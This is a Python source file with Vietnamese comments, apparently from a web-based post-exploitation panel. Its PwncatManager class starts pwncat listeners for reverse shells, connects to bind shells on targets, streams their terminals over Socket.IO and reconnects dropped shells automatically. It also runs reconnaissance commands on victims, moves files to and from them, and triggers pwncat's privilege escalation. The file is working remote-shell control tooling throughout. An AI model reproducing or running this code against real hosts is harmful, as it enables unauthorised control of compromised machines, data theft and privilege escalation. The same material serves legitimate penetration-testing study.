import subprocess
import threading
import time
import os
import pty
import select
import socket
import termios
import sys
from datetime import datetime

from urllib.parse import urlparse
from flask_socketio import SocketIO 

# Thêm import cho lưu DB
try:
    from apps.models import Targets, db, ShellConnection, ShellType, ShellStatus
except ImportError:
    Targets = None
    db = None

class PwncatManager:
    def __init__(self):
        self.shells = {}  # {shell_id: shell_info_dict}
        self.lock = threading.Lock()
        self.counter = 0
        self.reconnect_interval = 10  # giây
        # Không sử dụng Redis message queue, sử dụng memory queue
        self.socketio = None  # Sẽ được set từ bên ngoài
        self._auto_reconnect_thread = threading.Thread(target=self.auto_reconnect_shells, daemon=True)
        self._auto_reconnect_thread.start()

    def _generate_shell_id(self, prefix="shell"):
        with self.lock:
            self.counter += 1
            return f"{prefix}_{self.counter}_{int(time.time())}"

    def normalize_ip(self, target):
        # Nếu là IP, trả về luôn
        try:
            socket.inet_aton(target)
            return target
        except socket.error:
            pass
        # Nếu là URL, parse lấy hostname
        if target.startswith('http://') or target.startswith('https://'):
            hostname = urlparse(target).hostname
        else:
            hostname = target
        try:
            ip = socket.gethostbyname(hostname)
            return ip
        except Exception:
            return None

    def _emit_shell_status(self, shell_id, status):
        """Phát sự kiện Socket.IO khi trạng thái shell thay đổi"""
        if self.socketio:
            print(f"[DEBUG] Emitting shell status: {shell_id} -> {status}")
            self.socketio.emit('shell_status_update', {
                'shell_id': shell_id,
                'status': status
            }, namespace='/')
        else:
            print(f"[DEBUG] socketio not set, cannot emit status: {shell_id} -> {status}")

    def _emit_terminal_output(self, shell_id, data):
        """Phát dữ liệu terminal output qua Socket.IO"""
        if self.socketio:
            print(f"[DEBUG] Emitting terminal output: {shell_id} -> {repr(data)}")
            self.socketio.emit('terminal_output', {
                'shell_id': shell_id,
                'output': data
            }, namespace='/')
        else:
            print(f"[DEBUG] socketio not set, cannot emit output: {shell_id} -> {repr(data)}")

    def _pty_reader_thread(self, shell_id, master_fd):
        """Thread đọc dữ liệu từ PTY và gửi về client"""
        print(f"[DEBUG] Starting PTY reader thread for shell {shell_id}")
        connection_detected = False
        try:
            while True:
                # Đọc dữ liệu từ PTY
                ready, _, _ = select.select([master_fd], [], [], 0.1)
                if ready:
                    try:
                        data = os.read(master_fd, 1024)
                        if data:
                            print(f"[DEBUG] Read data from PTY for shell {shell_id}: {repr(data)}")
                            
                            # Detect khi victim kết nối (có output từ pwncat)
                            decoded_data = data.decode('utf-8', errors='ignore')
                            if not connection_detected and ('registered new host' in decoded_data or 'pwncat$' in decoded_data):
                                connection_detected = True
                                print(f"[DEBUG] Connection detected for shell {shell_id}, updating status to CONNECTED")
                                self._emit_shell_status(shell_id, "CONNECTED")
                                # Cập nhật trạng thái trong database
                                with self.lock:
                                    if shell_id in self.shells:
                                        self.shells[shell_id]["status"] = "connected"
                                        self.save_shell_to_db(self.shells[shell_id])
                            
                            # Gửi dữ liệu về client qua Socket.IO
                            self._emit_terminal_output(shell_id, data.decode('utf-8', errors='ignore'))
                        else:
                            print(f"[DEBUG] No data from PTY for shell {shell_id}, breaking")
                            # Không có dữ liệu, có thể shell đã đóng
                            break
                    except (OSError, IOError) as e:
                        print(f"[DEBUG] Error reading from PTY for shell {shell_id}: {e}")
                        break
                else:
                    # Kiểm tra xem shell còn tồn tại không
                    with self.lock:
                        if shell_id not in self.shells:
                            print(f"[DEBUG] Shell {shell_id} no longer exists, breaking")
                            break
        except Exception as e:
            print(f"[!] Error in PTY reader thread for shell {shell_id}: {e}")
        finally:
            print(f"[DEBUG] PTY reader thread ending for shell {shell_id}")
            # Đóng master_fd khi thread kết thúc
            try:
                os.close(master_fd)
            except:
                pass

    def start_listener(self, port, name=None, url=None, listen_ip='0.0.0.0'):
        """Khởi động listener với PTY (reverse shell: python -m pwncat -lp <port>)"""
        try:
            # Tạo PTY
            master_fd, slave_fd = pty.openpty()
            
            # Fix cứng: Lệnh reverse shell luôn là python -m pwncat -lp <port>
            cmd = ["python", "-m", "pwncat", "-lp", str(port)]
            print(f"[DEBUG] Starting pwncat with command: {' '.join(cmd)}")
            
            proc = subprocess.Popen(
                cmd,
                stdin=slave_fd,
                stdout=slave_fd,
                stderr=slave_fd,
                close_fds=True,
                preexec_fn=os.setsid
            )
            
            # Đóng slave_fd vì process đã sử dụng
            os.close(slave_fd)
            
            shell_id = name if name else self._generate_shell_id("listener")
            connect_time = datetime.utcnow().isoformat()
            
            info = {
                "id": shell_id,
                "proc": proc,
                "master_fd": master_fd,
                "type": "listener",
                "port": port,
                "ip": listen_ip,
                "hostname": None,
                "url": url,
                "connect_time": connect_time,
                "disconnect_time": None,
                "last_active": connect_time,
                "status": "listening",
                "shell_type": "reverse",
                "reconnect_count": 0,
                "last_status": "active"
            }
            
            with self.lock:
                self.shells[shell_id] = info
            
            # Tạo thread đọc dữ liệu từ PTY
            reader_thread = threading.Thread(
                target=self._pty_reader_thread,
                args=(shell_id, master_fd),
                daemon=True
            )
            reader_thread.start()
            
            print(f"[+] Started pwncat listener on port {port} as '{shell_id}' with PTY")
            print(f"[DEBUG] Process ID: {proc.pid}")
            print(f"[DEBUG] Waiting for connection on port {port}...")
            self.save_shell_to_db(info)
            self._emit_shell_status(shell_id, "LISTENING")
            
            return shell_id
            
        except Exception as e:
            print(f"[!] Error starting listener: {e}")
            # Cleanup nếu có lỗi
            try:
                os.close(master_fd)
            except:
                pass
            return None

    def connect_shell(self, target, target_port, name=None, url=None):
        """Kết nối bind shell với PTY (bind shell: python -m pwncat <ip> <port>)"""
        try:
            ip = self.normalize_ip(target)
            if not ip:
                print(f"[!] Could not resolve IP for target: {target}")
                return None
            
            # Tạo PTY
            master_fd, slave_fd = pty.openpty()
            
            # Sửa: Lệnh bind shell đúng chuẩn
            cmd = ["python", "-m", "pwncat", ip, str(target_port)]
            
            proc = subprocess.Popen(
                cmd,
                stdin=slave_fd,
                stdout=slave_fd,
                stderr=slave_fd,
                close_fds=True,
                preexec_fn=os.setsid
            )
            
            # Đóng slave_fd vì process đã sử dụng
            os.close(slave_fd)
            
            shell_id = name if name else self._generate_shell_id()
            connect_time = datetime.utcnow().isoformat()
            
            info = {
                "id": shell_id,
                "proc": proc,
                "master_fd": master_fd,
                "type": "connect",
                "ip": ip,
                "hostname": target,
                "url": url,
                "port": target_port,
                "connect_time": connect_time,
                "disconnect_time": None,
                "last_active": connect_time,
                "status": "connected",
                "shell_type": "bind",
                "reconnect_count": 0,
                "last_status": "active"
            }
            
            with self.lock:
                self.shells[shell_id] = info
            
            # Tạo thread đọc dữ liệu từ PTY
            reader_thread = threading.Thread(
                target=self._pty_reader_thread,
                args=(shell_id, master_fd),
                daemon=True
            )
            reader_thread.start()
            
            print(f"[+] Connected to shell at {ip}:{target_port} as '{shell_id}' with PTY")
            self._update_shell_info(shell_id)
            self.save_shell_to_db(info)
            self._emit_shell_status(shell_id, "CONNECTED")
            
            return shell_id
            
        except Exception as e:
            print(f"[!] Error connecting shell: {e}")
            # Cleanup nếu có lỗi
            try:
                os.close(master_fd)
            except:
                pass
            return None

    def send_input_to_shell(self, shell_id, data):
        """Gửi dữ liệu input vào shell qua PTY"""
        print(f"[DEBUG] Sending input to shell {shell_id}: {repr(data)}")
        with self.lock:
            info = self.shells.get(shell_id)
            if not info:
                print(f"[DEBUG] Shell {shell_id} not found in shells dict")
                return False
            
            master_fd = info.get("master_fd")
            if not master_fd:
                print(f"[DEBUG] Shell {shell_id} has no master_fd")
                return False
            
            try:
                # Ghi dữ liệu vào PTY
                print(f"[DEBUG] Writing {len(data)} bytes to PTY for shell {shell_id}")
                os.write(master_fd, data.encode('utf-8'))
                info["last_active"] = datetime.utcnow().isoformat()
                print(f"[DEBUG] Successfully sent input to shell {shell_id}")
                return True
            except (OSError, IOError) as e:
                print(f"[!] Error sending input to shell {shell_id}: {e}")
                return False

    def _update_shell_info(self, shell_id):
        """Cập nhật thông tin shell (user, os, hostname)"""
        info = self.shells.get(shell_id)
        if not info:
            return
        
        # Gửi lệnh để lấy thông tin
        self.send_input_to_shell(shell_id, "whoami\n")
        time.sleep(0.5)
        self.send_input_to_shell(shell_id, "hostname\n")
        time.sleep(0.5)
        self.send_input_to_shell(shell_id, "uname -a\n")

    def close_shell(self, shell_id):
        """Đóng shell và cleanup"""
        with self.lock:
            info = self.shells.get(shell_id)
            if info:
                proc = info["proc"]
                master_fd = info.get("master_fd")
                
                # Terminate process
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except:
                    try:
                        proc.kill()
                    except:
                        pass
                
                # Đóng master_fd
                if master_fd:
                    try:
                        os.close(master_fd)
                    except:
                        pass
                
                info["disconnect_time"] = datetime.utcnow().isoformat()
                info["last_status"] = "closed"
                info["status"] = "closed"
                self.save_shell_to_db(info)
                self._emit_shell_status(shell_id, "CLOSED")
                del self.shells[shell_id]
                print(f"[-] Closed shell '{shell_id}'")
                return True
            else:
                print(f"[!] Shell '{shell_id}' not found.")
                return False

    def check_shell_alive(self, shell_id):
        """Kiểm tra shell còn hoạt động không"""
        info = self.shells.get(shell_id)
        if not info:
            return False
        
        proc = info["proc"]
        alive = proc.poll() is None
        if not alive:
            info["last_status"] = "disconnected"
            info["status"] = "disconnected"
            info["disconnect_time"] = datetime.utcnow().isoformat()
            self.save_shell_to_db(info)
            self._emit_shell_status(shell_id, "DISCONNECTED")
        return alive

    def auto_reconnect_shells(self):
        """Tự động reconnect shells bị mất kết nối"""
        while True:
            time.sleep(self.reconnect_interval)
            with self.lock:
                for shell_id, info in list(self.shells.items()):
                    if not self.check_shell_alive(shell_id):
                        print(f"[!] Shell {shell_id} lost. Attempting to reconnect...")
                        if info.get("shell_type") == "bind" and info.get("ip") and info.get("port"):
                            info["reconnect_count"] += 1
                            info["last_status"] = "reconnecting"
                            self.save_shell_to_db(info)
                            self._emit_shell_status(shell_id, "RECONNECTING")
                            try:
                                new_shell_id = self.connect_shell(info["ip"], info["port"], name=shell_id, url=info.get("url"))
                                print(f"[+] Reconnected shell {shell_id} as {new_shell_id}")
                                self._emit_shell_status(shell_id, "CONNECTED")
                            except Exception as e:
                                print(f"[!] Failed to reconnect shell {shell_id}: {e}")
                                self._emit_shell_status(shell_id, "DISCONNECTED")
                        elif info.get("shell_type") == "reverse" and info.get("port"):
                            info["reconnect_count"] += 1
                            info["last_status"] = "re-listening"
                            self.save_shell_to_db(info)
                            self._emit_shell_status(shell_id, "RE-LISTENING")
                            try:
                                new_shell_id = self.start_listener(info["port"], name=shell_id, url=info.get("url"))
                                print(f"[+] Restarted listener for shell {shell_id} as {new_shell_id}")
                                self._emit_shell_status(shell_id, "LISTENING")
                            except Exception as e:
                                print(f"[!] Failed to restart listener for shell {shell_id}: {e}")
                                self._emit_shell_status(shell_id, "DISCONNECTED")
    
    def save_shell_to_db(self, info):
        """Lưu thông tin shell vào database"""
        if not Targets or not db:
            return
        try:
            # Chỉ log thông tin, không save vào DB trong thread
            print(f"[DEBUG] Would save shell to DB: {info.get('id')} - {info.get('status')}")
            # TODO: Implement proper database saving in main thread
        except Exception as e:
            print(f"[!] Error saving shell info to DB: {e}")

    # Các method cũ để tương thích ngược
    def send_command(self, shell_id, command, timeout=3):
        """Gửi lệnh tới shell (tương thích ngược)"""
        return self.send_input_to_shell(shell_id, command + "\n")

    def read_output(self, shell_id, timeout=3):
        """Đọc output từ shell (tương thích ngược)"""
        # Không cần implement vì output sẽ được gửi qua socket
        return "Output sent via socket"

    def upload_file(self, shell_id, local_path, remote_path):
        """Upload file (tương thích ngược)"""
        info = self.shells.get(shell_id)
        if not info:
            return False
        try:
            self.send_input_to_shell(shell_id, f"upload {local_path} {remote_path}\n")
            return True
        except Exception as e:
            print(f"[!] Error uploading file: {e}")
            return False

    def download_file(self, shell_id, remote_path, local_path):
        """Download file (tương thích ngược)"""
        info = self.shells.get(shell_id)
        if not info:
            return False
        try:
            self.send_input_to_shell(shell_id, f"download {remote_path} {local_path}\n")
            return True
        except Exception as e:
            print(f"[!] Error downloading file: {e}")
            return False

    def escalate_privilege(self, shell_id, user=None):
        """Escalate privilege (tương thích ngược)"""
        info = self.shells.get(shell_id)
        if not info:
            return False
        try:
            if user:
                self.send_input_to_shell(shell_id, f"escalate run -u {user}\n")
            else:
                self.send_input_to_shell(shell_id, "escalate run\n")
            return True
        except Exception as e:
            print(f"[!] Error escalating privilege: {e}")
            return False

# Tạo instance global
shell_manager = PwncatManager()